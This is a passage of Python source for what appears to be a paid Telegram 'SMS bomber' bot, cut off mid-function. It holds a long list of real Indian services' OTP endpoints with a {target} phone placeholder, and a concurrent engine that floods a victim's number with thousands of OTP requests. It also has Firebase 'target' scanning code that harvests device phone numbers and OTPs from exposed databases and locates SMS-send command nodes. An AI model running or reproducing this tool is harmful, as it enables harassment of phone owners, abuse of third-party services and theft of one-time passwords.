    ("legacy:ConfirmTkt", "legacy", "GET",
     "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={target}",
     {}, None),
    ("legacy:Ola", "legacy", "POST",
     "https://accounts.olacabs.com/api/login",
     {"Content-Type": "application/json",
      "X-Requested-With": "XMLHttpRequest",
      "origin": "https://accounts.olacabs.com"},
     {"mobileNumber": "{target}", "dialingCode": "+91", "countryCode": "IN"}),
    ("legacy:OlaV1", "legacy", "POST",
     "https://accounts.olacabs.com/api/v1/login",
     {"Content-Type": "application/json",
      "origin": "https://accounts.olacabs.com"},
     {"mobileNumber": "{target}", "dialingCode": "+91", "countryCode": "IN"}),
    ("legacy:Uber", "legacy", "POST",
     "https://auth.uber.com/api/v1/signup",
     {"Content-Type": "application/json",
      "origin": "https://auth.uber.com"},
     {"phone": "{target}", "country_code": "+91"}),
    ("legacy:Rapido", "legacy", "POST",
     "https://customer.rapido.bike/api/otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:MeruCab", "legacy", "POST",
     "https://merucabapp.com/api/otp/generate",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobile_number={target}"),
    ("legacy:GoPinkCabs", "legacy", "POST",
     "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=check_mobile_number=1&contact={target}"),
    ("legacy:Zomato", "legacy", "POST",
     "https://www.zomato.com/webroutes/auth/login",
     {"Content-Type": "application/json",
      "origin": "https://www.zomato.com"},
     {"country_id": 1, "phone": "{target}",
      "verification_type": "sms", "method": "phone"}),
    ("legacy:Swiggy", "legacy", "POST",
     "https://www.swiggy.com/mapi/auth/signup",
     {"Content-Type": "application/json",
      "origin": "https://www.swiggy.com"},
     {"name": "test", "email": "test@example.com",
      "password": "test12345", "referral_code": "",
      "mobile": "{target}"}),
    ("legacy:Domino", "legacy", "POST",
     "https://api.dominos.co.in/loginhandler/forgotpassword",
     {"Content-Type": "application/json",
      "origin": "https://m.dominos.co.in"},
     {"lastName": "", "mobile": "{target}", "firstName": ""}),
    ("legacy:PizzaHut", "legacy", "POST",
     "https://api.pizzahut.io/v1/otp/generate",
     {"Content-Type": "application/json; charset=utf-8",
      "origin": "https://www.pizzahut.co.in"},
     {"phone": "+91{target}"}),
    ("legacy:KFC", "legacy", "POST",
     "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://online.kfc.co.in"},
     {"phoneNumber": "{target}", "AuthorizedFor": "3", "Resend": "false"}),
    ("legacy:BurgerKing", "legacy", "POST",
     "https://consumer-apis.burgerking.in/api/v1/user/signUp",
     {"Content-Type": "application/json",
      "platform": "web", "type": "dinein",
      "origin": "https://www.burgerking.in"},
     {"phone_no": "{target}"}),
    ("legacy:Dineout", "legacy", "POST",
     "https://www.dineout.co.in/xhrajaxrequest/user_signup",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "origin": "https://www.dineout.co.in"},
     "_raw=name=Test+User&email=test%40example.com&phone={target}"),
    ("legacy:RummyCircle", "legacy", "POST",
     "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     {"Content-Type": "application/json"},
     {"phone": "{target}",
      "isPlaycircle": "72abdd9a-7038-41c0-a57d-d0022dac60da",
      "deviceName": "Android", "refCode": ""}),
    ("legacy:My11Circle", "legacy", "POST",
     "https://www.my11circle.com/api/fl/auth/v3/getOtp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("legacy:PokerBaazi", "legacy", "POST",
     "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "mfa_channels": "phno"}),
    ("legacy:Dream11", "legacy", "POST",
     "https://www.dream11.com/graphql/mutation/pwa/register",
     {"Content-Type": "application/json", "device": "pwa",
      "origin": "https://www.dream11.com"},
     {"query": "mutation register($email:String!$mobileNumber:String!$password:String!$site:String){registerSendOTPMutation(email:$email mobileNumber:$mobileNumber password:$password site:$site){message}}",
      "variables": {"email": "test@example.com",
                    "mobileNumber": "{target}",
                    "password": "TestPass123"}}),
    ("legacy:BigCash", "legacy", "GET",
     "https://www.bigcash.live/sendsms.php?mobile={target}&ip=192.168.1.1",
     {"Referer": "https://www.bigcash.live/games/poker"}, None),
    ("legacy:A23Games", "legacy", "POST",
     "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "device_id": "android123",
      "model": "Google,Android SDK built for x86,10",
      "otp": "", "referBy": "", "signup": True, "version": "1.0.5"}),
    ("legacy:Howzat", "legacy", "POST",
     "https://mercury.howzat.com/api/auth/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:WorkIndia", "legacy", "GET",
     "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={target}&version_number=623",
     {}, None),
    ("legacy:Apna", "legacy", "POST",
     "https://production.apna.co/api/userprofile/v1/otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hash_type": "play_store"}),
    ("legacy:ApnaAlt", "legacy", "POST",
     "https://apna.co/api/userprofile/v1/otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hash_type": "play_store"}),
    ("legacy:Otpless", "legacy", "POST",
     "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "selectedCountryCode": "+91"}),
    ("legacy:NewMe", "legacy", "POST",
     "https://prodapi.newme.asia/web/otp/request",
     {"Content-Type": "application/json"},
     {"mobile_number": "{target}", "resend_otp_request": True}),
    ("legacy:HyugaAuth", "legacy", "POST",
     "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("legacy:TooToo", "legacy", "POST",
     "https://tootoo.in/graphql",
     {"Content-Type": "application/json"},
     {"query": "query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename }}",
      "variables": {"mobile_no": "{target}", "resend": 0}}),
    ("legacy:SmartCoin", "legacy", "GET",
     "https://webapp.smartcoin.co.in/users/null/otpVerification/requestOtp/REGISTRATION/SMS?phoneNumber={target}",
     {}, None),
    ("legacy:Docon", "legacy", "POST",
     "https://docon.co.in/api/v1/user/online-login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("legacy:DaycoIndia", "legacy", "POST",
     "https://ekyc.daycoindia.com/api/nscript_functions.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=api=send_otp&brand=dayco&mob={target}&resend_otp=resend_otp"),
    ("legacy:SnitchSMS", "legacy", "POST",
     "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     {"Content-Type": "application/json"},
     {"mobile_number": "+91{target}"}),
    ("legacy:SnitchResendSMS", "legacy", "POST",
     "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/resend/sms",
     {"Content-Type": "application/json"},
     {"mobile_number": "+91{target}"}),
    ("legacy:BeepKart", "legacy", "POST",
     "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "city": 362}),
    ("legacy:BikeFixup", "legacy", "POST",
     "https://api.bikefixup.com/api/v2/send-registration-otp",
     {"Content-Type": "application/json; charset=UTF-8"},
     {"phone": "{target}", "app_signature": "4pFtQJwcz6y"}),
    ("legacy:Animall", "legacy", "POST",
     "https://animall.in/zap/auth/login",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "signupPlatform": "NATIVE_ANDROID"}),
    ("legacy:DeHaat", "legacy", "POST",
     "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "client_id": "kisan-app"}),
    ("legacy:Khatabook", "legacy", "POST",
     "https://api.khatabook.com/v1/auth/request-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "app_signature": "wk+avHrHZf2"}),
    ("legacy:Vyapar", "legacy", "GET",
     "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={target}",
     {}, None),
    ("legacy:Kredily", "legacy", "POST",
     "https://app.kredily.com/ws/v1/accounts/send-otp/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("legacy:MamaEarth", "legacy", "POST",
     "https://auth.mamaearth.in/v1/auth/initiate-signup",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "referralCode": ""}),
    ("legacy:HomeTriangle", "legacy", "POST",
     "https://hometriangle.com/api/partner/xauth/signup/otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("legacy:MyGov", "legacy", "GET",
     "https://auth.mygov.in/regapi/register_api_ver1/?api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&phone={target}",
     {}, None),
    ("legacy:CodFirm", "legacy", "GET",
     "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{target}&email=&storeUrl=bellavita1.myshopify.com",
     {}, None),
    ("legacy:ShipRocket", "legacy", "POST",
     "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
     {"Content-Type": "application/json"},
     {"mobileNumber": "{target}"}),
    ("legacy:AstroSage", "legacy", "GET",
     "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={target}",
     {}, None),
    ("legacy:Nykaa", "legacy", "POST",
     "https://www.nykaa.com/app-api/index.php/customer/send_otp",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobile_number={target}&source=sms&platform=ANDROID&domain=nykaa"),
    ("legacy:Quikr", "legacy", "POST",
     "https://www.quikr.com/core/sendOtp",
     {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      "origin": "https://www.quikr.com"},
     "_raw=user={target}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88"),
    ("legacy:Gaana", "legacy", "POST",
     "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
     {"Content-Type": "application/json; charset=utf-8",
      "channel": "gaana.com", "platform": "android"},
     {"mobile": "+91-{target}"}),
    ("legacy:BookMyShow", "legacy", "POST",
     "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
     {"Content-Type": "application/json",
      "origin": "https://in.bookmyshow.com"},
     {"channel": "phone", "subChannel": "sms",
      "details": {"phone": "{target}",
                  "origin": "https://in.bookmyshow.com"}}),
    ("legacy:ASVMFaizabad", "legacy", "POST",
     "http://asvmfaizabad.org/register.php",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "http://asvmfaizabad.org"},
     "_raw=sname=Test&sclass=XII&sphone={target}&spassword=test1234&ssection=A&submit="),
]


# ─────────────────────────────────────────────────────────────
# FIREBASE TARGETS
# ─────────────────────────────────────────────────────────────
FIREBASE_URLS_RAW = """
https://babuji-efd18-default-rtdb.firebaseio.com
""".strip()


# ─────────────────────────────────────────────────────────────
# SEED HELPERS
# ─────────────────────────────────────────────────────────────
def _body_to_string(d):
    if d is None:
        return ""
    if isinstance(d, str):
        return d
    if isinstance(d, dict):
        if "_raw" in d:
            return str(d["_raw"])
        return json.dumps(d, separators=(",", ":"), ensure_ascii=False)
    return str(d)


def _headers_to_string(h):
    if not h:
        return ""
    if isinstance(h, str):
        return h
    return "\n".join(f"{k}: {v}" for k, v in h.items())


def seed_all_endpoints(force_refresh=False):
    added = 0
    for name, cat, method, url, headers, body in MASTER_ENDPOINTS:
        if not force_refresh and _exec("SELECT 1 FROM apis WHERE name=?",
                                       (name,), fetch="one"):
            continue
        if force_refresh:
            _exec("DELETE FROM apis WHERE name=?", (name,))
        _exec("INSERT INTO apis(name,channel,category,url,method,body,headers,"
              "active,created_at) VALUES(?,?,?,?,?,?,?,?,?)",
              (name, "http", cat, url, method,
               _body_to_string(body), _headers_to_string(headers),
               1, int(time.time())))
        added += 1
    log.info("seed: +%d endpoints", added)


def _norm_fb_url(url):
    url = url.strip()
    if not url:
        return ""
    if "?" in url:
        url = url.split("?", 1)[0]
    url = url.rstrip("/")
    return url


def seed_firebase(force_refresh=False):
    seen = set()
    added = 0
    skip = (
        "https://console.firebase.google.com",
        "https://test.firebaseio.com",
        "https://test-firebase.firebaseio.com",
        "https://db-name.firebaseio.com",
        "https://your-project-id-default-rtdb.firebaseio.com",
    )
    for raw in FIREBASE_URLS_RAW.splitlines():
        url = _norm_fb_url(raw)
        if not url or url in seen:
            continue
        seen.add(url)
        if url in skip:
            continue
        exists = _exec("SELECT 1 FROM firebase_targets WHERE url=?",
                       (url,), fetch="one")
        if exists and not force_refresh:
            continue
        try:
            host = url.split("//", 1)[1].rstrip("/")
        except Exception:
            host = url
        name = host[:120]
        clash = _exec("SELECT 1 FROM firebase_targets WHERE name=?",
                      (name,), fetch="one")
        if clash:
            name = name[:100] + "_" + str(abs(hash(url)))[:8]
        try:
            _exec("INSERT OR IGNORE INTO firebase_targets(name,url,active,"
                  "created_at) VALUES(?,?,1,?)",
                  (name, url, int(time.time())))
            added += 1
        except Exception:
            pass
    log.info("firebase seed: +%d targets", added)


# ─────────────────────────────────────────────────────────────
# INIT DB
# ─────────────────────────────────────────────────────────────
def init_db():
    _conn.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        user_id       INTEGER PRIMARY KEY,
        username      TEXT,
        first_name    TEXT,
        credits       INTEGER DEFAULT 0,
        coins         INTEGER DEFAULT 0,
        banned        INTEGER DEFAULT 0,
        lifetime      INTEGER DEFAULT 0,
        last_bomb     INTEGER DEFAULT 0,
        total_bombs   INTEGER DEFAULT 0,
        total_sent    INTEGER DEFAULT 0,
        total_pushes  INTEGER DEFAULT 0,
        last_daily    INTEGER DEFAULT 0,
        referred_by   INTEGER,
        ref_count     INTEGER DEFAULT 0,
        created_at    INTEGER
    );
    CREATE TABLE IF NOT EXISTS admins (
        user_id    INTEGER PRIMARY KEY,
        added_by   INTEGER,
        added_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS redeem_codes (
        code        TEXT PRIMARY KEY,
        amount      INTEGER NOT NULL,
        currency    TEXT DEFAULT 'credits',
        max_uses    INTEGER NOT NULL,
        used        INTEGER DEFAULT 0,
        created_by  INTEGER,
        created_at  INTEGER,
        active      INTEGER DEFAULT 1
    );
    CREATE TABLE IF NOT EXISTS redeem_uses (
        code     TEXT,
        user_id  INTEGER,
        used_at  INTEGER,
        PRIMARY KEY (code, user_id)
    );
    CREATE TABLE IF NOT EXISTS apis (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        name         TEXT UNIQUE,
        channel      TEXT DEFAULT 'http',
        category     TEXT DEFAULT 'legacy',
        url          TEXT NOT NULL,
        method       TEXT DEFAULT 'GET',
        body         TEXT DEFAULT '',
        headers      TEXT DEFAULT '',
        active       INTEGER DEFAULT 1,
        fail_streak  INTEGER DEFAULT 0,
        ok_count     INTEGER DEFAULT 0,
        fail_count   INTEGER DEFAULT 0,
        created_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS bomb_history (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        target   TEXT,
        count    INTEGER,
        msg      TEXT,
        ok       INTEGER,
        fail     INTEGER,
        category TEXT,
        ts       INTEGER
    );
    CREATE TABLE IF NOT EXISTS blacklist (
        target   TEXT PRIMARY KEY,
        added_by INTEGER,
        added_at INTEGER
    );
    CREATE TABLE IF NOT EXISTS settings (
        key   TEXT PRIMARY KEY,
        value TEXT
    );
    CREATE TABLE IF NOT EXISTS logs (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        action   TEXT,
        detail   TEXT,
        ts       INTEGER
    );
    CREATE TABLE IF NOT EXISTS firebase_targets (
        id                 INTEGER PRIMARY KEY AUTOINCREMENT,
        name               TEXT UNIQUE,
        url                TEXT UNIQUE,
        active             INTEGER DEFAULT 1,
        device_count       INTEGER DEFAULT 0,
        otp_count          INTEGER DEFAULT 0,
        online_count       INTEGER DEFAULT 0,
        total_count        INTEGER DEFAULT 0,
        reachable          INTEGER DEFAULT 0,
        last_scan          INTEGER DEFAULT 0,
        last_error         TEXT DEFAULT '',
        discovered_tree    TEXT DEFAULT '',
        devices_node       TEXT DEFAULT 'devices',
        messages_node      TEXT DEFAULT 'messages',
        send_node          TEXT DEFAULT 'sms',
        push_ok            INTEGER DEFAULT 0,
        push_fail          INTEGER DEFAULT 0,
        created_at         INTEGER
    );
    CREATE TABLE IF NOT EXISTS firebase_devices (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        firebase_id INTEGER,
        device_key  TEXT,
        phone       TEXT,
        info        TEXT,
        otp         TEXT,
        path        TEXT,
        last_seen   INTEGER,
        UNIQUE(firebase_id, device_key)
    );
    CREATE TABLE IF NOT EXISTS firebase_test_ids (
        slot        INTEGER PRIMARY KEY,
        firebase_id INTEGER,
        device_key  TEXT,
        added_at    INTEGER
    );
    """)

    if not _col_exists("users", "coins"):
        _conn.execute("ALTER TABLE users ADD COLUMN coins INTEGER DEFAULT 0")
    if not _col_exists("users", "lifetime"):
        _conn.execute("ALTER TABLE users ADD COLUMN lifetime INTEGER DEFAULT 0")
    if not _col_exists("users", "total_sent"):
        _conn.execute("ALTER TABLE users ADD COLUMN total_sent INTEGER DEFAULT 0")
    if not _col_exists("users", "total_pushes"):
        _conn.execute("ALTER TABLE users ADD COLUMN total_pushes INTEGER DEFAULT 0")
    if not _col_exists("redeem_codes", "currency"):
        _conn.execute("ALTER TABLE redeem_codes ADD COLUMN currency TEXT DEFAULT 'credits'")
    for col, ddl in (
        ("discovered_tree", "ALTER TABLE firebase_targets ADD COLUMN discovered_tree TEXT DEFAULT ''"),
        ("devices_node",    "ALTER TABLE firebase_targets ADD COLUMN devices_node TEXT DEFAULT 'devices'"),
        ("messages_node",   "ALTER TABLE firebase_targets ADD COLUMN messages_node TEXT DEFAULT 'messages'"),
        ("send_node",       "ALTER TABLE firebase_targets ADD COLUMN send_node TEXT DEFAULT 'sms'"),
        ("online_count",    "ALTER TABLE firebase_targets ADD COLUMN online_count INTEGER DEFAULT 0"),
        ("total_count",     "ALTER TABLE firebase_targets ADD COLUMN total_count INTEGER DEFAULT 0"),
    ):
        try:
            if not _col_exists("firebase_targets", col):
                _conn.execute(ddl)
        except Exception:
            pass

    for key, val in (
        ("cost_per_min",     DEFAULT_COST_PER_MIN),
        ("lifetime_cost",    DEFAULT_LIFETIME_COST),
        ("cooldown",         DEFAULT_COOLDOWN),
        ("concurrency",      DEFAULT_CONCURRENCY),
        ("daily_bonus",      DEFAULT_DAILY_BONUS),
        ("referral_bonus",   REFERRAL_BONUS),
        ("maintenance",      0),
        ("country_code",     "91"),
        ("coin_cost",        DEFAULT_COIN_COST),
    ):
        _conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)",
                      (key, str(val)))

    if _exec("SELECT COUNT(*) c FROM admins", fetch="one")["c"] == 0:
        for uid in ADMIN_IDS_ENV:
            _exec("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) "
                  "VALUES(?,?,?)", (uid, 0, int(time.time())))

    seed_all_endpoints()
    seed_firebase()


# ─────────────────────────────────────────────────────────────
# SETTINGS / UTIL
# ─────────────────────────────────────────────────────────────
def setting(key, cast=str):
    row = _exec("SELECT value FROM settings WHERE key=?", (key,), fetch="one")
    return cast(row["value"]) if row else None


def set_setting(key, value):
    _exec("INSERT INTO settings(key,value) VALUES(?,?) "
          "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
          (key, str(value)))


def gen_code(n=10):
    return "".join(secrets.choice(string.ascii_uppercase + string.digits)
                   for _ in range(n))


def is_admin(uid):
    return _exec("SELECT 1 FROM admins WHERE user_id=?",
                 (uid,), fetch="one") is not None


def is_blacklisted(target):
    return _exec("SELECT 1 FROM blacklist WHERE target=?",
                 (target,), fetch="one") is not None


def fmt_target(raw, category):
    digits = "".join(c for c in raw if c.isdigit())
    if category == "legacy":
        if len(digits) > 10:
            digits = digits[-10:]
        return digits
    if len(digits) == 10:
        digits = setting("country_code") + digits
    return digits


# ─────────────────────────────────────────────────────────────
# USER CRUD
# ─────────────────────────────────────────────────────────────
def get_user(uid):
    return _exec("SELECT * FROM users WHERE user_id=?", (uid,), fetch="one")


def ensure_user(u: types.User, referrer=None):
    row = get_user(u.id)
    if not row:
        _exec("INSERT INTO users(user_id,username,first_name,credits,coins,"
              "referred_by,created_at) VALUES(?,?,?,0,0,?,?)",
              (u.id, u.username or "", u.first_name or "",
               referrer, int(time.time())))
        if referrer and referrer != u.id:
            bonus = setting("referral_bonus", int)
            add_credits(referrer, bonus)
            _exec("UPDATE users SET ref_count=ref_count+1 WHERE user_id=?",
                  (referrer,))
        row = get_user(u.id)
    else:
        _exec("UPDATE users SET username=?, first_name=? WHERE user_id=?",
              (u.username or "", u.first_name or "", u.id))
    return row


def add_credits(uid, amount):
    _exec("UPDATE users SET credits=credits+? WHERE user_id=?", (amount, uid))


def take_credits(uid, amount):
    with _conn:
        cur = _conn.execute(
            "UPDATE users SET credits=credits-? WHERE user_id=? AND credits>=?",
            (amount, uid, amount))
        return cur.rowcount > 0


def add_coins(uid, amount):
    _exec("UPDATE users SET coins=coins+? WHERE user_id=?", (amount, uid))


def take_coins(uid, amount):
    with _conn:
        cur = _conn.execute(
            "UPDATE users SET coins=coins-? WHERE user_id=? AND coins>=?",
            (amount, uid, amount))
        return cur.rowcount > 0


def log_action(uid, action, detail=""):
    _exec("INSERT INTO logs(user_id,action,detail,ts) VALUES(?,?,?,?)",
          (uid, action, detail[:500], int(time.time())))


def prune_logs():
    cutoff = int(time.time()) - LOG_RETENTION_DAYS * 86400
    with _conn:
        _conn.execute("DELETE FROM logs WHERE ts < ?", (cutoff,))


# ─────────────────────────────────────────────────────────────
# MIDDLEWARE
# ─────────────────────────────────────────────────────────────
class AutoRegisterMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        u = getattr(event, "from_user", None)
        if u and not u.is_bot:
            ensure_user(u)
        return await handler(event, data)


# ─────────────────────────────────────────────────────────────
# SMS BOMBER ENGINE
# ─────────────────────────────────────────────────────────────
def _render(template, target, msg):
    if not template:
        return ""
    return (template
            .replace("{target}", target)
            .replace("{phone}", target)
            .replace("{msg}", msg))


def _parse_headers(raw):
    out = {}
    if not raw:
        return out
    for line in raw.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


async def _hit_http(session, row, target, msg):
    url = _render(row["url"], target, msg)
    method = (row["method"] or "GET").upper()
    body = _render(row["body"], target, msg)
    headers = _parse_headers(row["headers"])
    headers.setdefault("User-Agent", USER_AGENT)
    headers.setdefault("Accept", "*/*")
    headers.setdefault("Accept-Language", "en-IN,en;q=0.9")

    timeout = aiohttp.ClientTimeout(total=HTTP_TIMEOUT_TOTAL,
                                    connect=HTTP_TIMEOUT_CONNECT)

    async def attempt():
        try:
            data_bytes = body.encode("utf-8") if body else None
            if method == "POST":
                async with session.post(url, data=data_bytes,
                                        headers=headers,
                                        timeout=timeout, ssl=False) as r:
                    await r.read()
                    return r.status
            elif method == "PUT":
                async with session.put(url, data=data_bytes,
                                       headers=headers,
                                       timeout=timeout, ssl=False) as r:
                    await r.read()
                    return r.status
            else:
                async with session.get(url, headers=headers,
                                       timeout=timeout, ssl=False) as r:
                    await r.read()
                    return r.status
        except Exception:
            return 0

    status = await attempt()
    if 200 <= status < 400:
        return True
    if status in (429, 500, 502, 503, 504):
        await asyncio.sleep(0.4)
        status = await attempt()
        if 200 <= status < 400:
            return True
    return False


def _update_api_health(api_id, ok):
    try:
        if ok:
            _exec("UPDATE apis SET ok_count=ok_count+1, fail_streak=0 "
                  "WHERE id=?", (api_id,))
        else:
            _exec("UPDATE apis SET fail_count=fail_count+1, "
                  "fail_streak=fail_streak+1 WHERE id=?", (api_id,))
            r = _exec("SELECT fail_streak FROM apis WHERE id=?",
                      (api_id,), fetch="one")
            if r and r["fail_streak"] >= API_FAIL_THRESHOLD:
                _exec("UPDATE apis SET active=0 WHERE id=?", (api_id,))
    except Exception:
        pass


async def run_bomber(target, duration_sec, stop_ev, progress_cb=None):
    apis = _exec("SELECT * FROM apis WHERE active=1 AND channel='http'",
                 fetch="all")
    if not apis:
        return 0, 0, "no active endpoints"

    global_cap = setting("concurrency", int) or DEFAULT_CONCURRENCY
    per_host_cap = DEFAULT_PER_HOST_CAP

    ok = [0]
    fail = [0]
    last_report = [0.0]
    end_at = time.time() + duration_sec

    def host_of(u):
        try:
            return u.split("//", 1)[1].split("/", 1)[0]
        except Exception:
            return u

    host_sems = {}
    for a in apis:
        h = host_of(a["url"])
        if h not in host_sems:
            host_sems[h] = asyncio.Semaphore(per_host_cap)

    by_cat = {}
    for a in apis:
        by_cat.setdefault(a["category"], []).append(a)
    weights = []
    for cat, lst in by_cat.items():
        w = max(1, 60 // len(lst))
        for _ in lst:
            weights.append(w)
    total_weight = sum(weights) or 1
    n_workers = min(global_cap * 2, 4000)
    worker_plan = []
    for i, a in enumerate(apis):
        share = max(1, (weights[i] * n_workers) // total_weight)
        for _ in range(share):
            worker_plan.append(a)

    global_sem = asyncio.Semaphore(global_cap)

    connector = aiohttp.TCPConnector(
        limit=global_cap * 2,
        limit_per_host=per_host_cap * 2,
        ttl_dns_cache=300,
        use_dns_cache=True,
        ssl=False,
        force_close=False,
    )
    session = aiohttp.ClientSession(connector=connector,
                                    auto_decompress=False,
                                    headers={"User-Agent": USER_AGENT})

    async def _fire(api):
        tgt = fmt_target(target, api["category"])
        h = host_of(api["url"])
        async with global_sem:
            async with host_sems[h]:
                return await _hit_http(session, api, tgt, "OTP")

    async def worker(api):
        while time.time() < end_at and not stop_ev.is_set():
            try:
                hit = await _fire(api)
            except Exception:
                hit = False
            if hit:
                ok[0] += 1
            else:
                fail[0] += 1
            _update_api_health(api["id"], hit)
            if progress_cb:
                now = time.time()
                if now - last_report[0] >= 2.0:
                    last_report[0] = now
                    try:
                        await progress_cb(ok[0], fail[0],
                                          int(end_at - now))
                    except Exception:
                        pass

    try:
        tasks = [asyncio.create_task(worker(a)) for a in worker_plan]
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        try:
            await session.close()
        except Exception:
            pass

    return ok[0], fail[0], None


# ─────────────────────────────────────────────────────────────
# FIREBASE CORE
# ─────────────────────────────────────────────────────────────
DEVICE_NODE_HINTS   = ["devices", "device", "clients", "users", "phones",
                       "targets", "bots", "sims", "online"]
MESSAGE_NODE_HINTS  = ["messages", "message", "sms", "chats", "chat",
                       "inbox", "logs", "data"]
SEND_NODE_HINTS     = ["sms", "send", "send_sms", "sendsms", "queue",
                       "outbox", "pending", "commands", "cmd", "tasks"]


def _looks_like_device_entry(v):
    if not isinstance(v, dict):
        return False
    keys = {str(k).lower() for k in v.keys()}
    flags = 0
    if any(k in keys for k in ("online", "is_online", "status", "active")):
        flags += 1
    if any(k in keys for k in ("number", "phone", "sim", "sim_number",
                                "mobile", "phone_number")):
        flags += 1
    if any(k in keys for k in ("last_seen", "lastseen", "lastseen_at",
                                "updated_at", "ts", "timestamp")):
        flags += 1
    if any(k in keys for k in ("model", "battery", "device_id", "id",
                                "deviceid")):
        flags += 1
    return flags >= 2


def _discover_tree(data):
    result = {"devices": None, "messages": None, "send": None}
    if not isinstance(data, dict):
        return result
    top = {str(k).lower(): k for k in data.keys()}

    for hint in DEVICE_NODE_HINTS:
        if hint in top:
            v = data[top[hint]]
            if isinstance(v, dict):
                samples = list(v.values())[:5]
                score = sum(1 for s in samples
                            if _looks_like_device_entry(s))
                if score >= max(1, len(samples) // 2):
                    result["devices"] = top[hint]
                    break

    if not result["devices"]:
        for k, v in data.items():
            if not isinstance(v, dict):
                continue
            samples = list(v.values())[:5]
            if not samples:
                continue
            score = sum(1 for s in samples
                        if _looks_like_device_entry(s))
            if score >= max(1, len(samples) // 2):
                result["devices"] = k
                break

    for hint in MESSAGE_NODE_HINTS:
        if hint in top:
            result["messages"] = top[hint]
            break

    for hint in SEND_NODE_HINTS:
        if hint in top:
            result["send"] = top[hint]
            break

    if not result["devices"]:
        result["devices"] = "devices"
    if not result["messages"]:
        result["messages"] = "messages"
    if not result["send"]:
        result["send"] = "sms"

    return result


def _extract_online(dev_obj):
    if not isinstance(dev_obj, dict):
        return False
    for k in ("online", "is_online", "isOnline", "active", "status"):
        if k in dev_obj:
            v = dev_obj[k]
            if isinstance(v, bool):
                return v
            if isinstance(v, str) and v.lower() in ("true", "online",
                                                     "active", "1"):
                return True
            if isinstance(v, (int, float)) and v:
                return True
    for k in ("last_seen", "lastseen", "lastSeen", "ts", "timestamp"):
        if k in dev_obj:
            try:
                t = float(dev_obj[k])
                if t > 1e12:
                    t //= 1000
                if time.time() - t < 300:
                    return True
            except Exception:
                pass
    return False


def _extract_number(dev_obj):
    if not isinstance(dev_obj, dict):
        return ""
    for k in ("number", "phone", "mobile", "sim", "sim_number",
              "phone_number", "simNumber", "phoneNumber"):
        if k in dev_obj:
            v = str(dev_obj[k] or "").strip()
            digits = "".join(c for c in v if c.isdigit())
            if 10 <= len(digits) <= 13:
                return digits[-10:]
    return ""


def _walk_fb_phones_otps(obj, path=""):
    phones = {}
    otps = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            k_lower = str(k).lower()
            newpath = f"{path}/{k}" if path else str(k)
